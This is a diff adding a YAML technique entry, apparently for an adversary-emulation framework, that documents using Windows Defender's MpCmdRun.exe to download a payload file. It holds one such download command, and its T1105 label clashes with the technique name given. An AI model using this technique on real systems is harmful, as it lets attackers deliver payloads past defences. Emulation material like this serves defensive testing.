@@ -1,0 +1,25 @@
+- id: c1eb3c58-306d-1527-af07-b5e9f614d340
+  name: MpCmdRun.exe - Download file to specified path - Slashes work as well as dashes
+    (/DownloadFile, /url, /path)
+  description: Download file to specified path - Slashes work as well as dashes (/DownloadFile,
+    /url, /path)
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: MpCmdRun.exe -DownloadFile -url payload.exe -path payload.exe
+        payloads:
+        - payload.exe
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2020-03-20'
+  modified: '2020-03-20'
+  operating_system: Windows All Versions
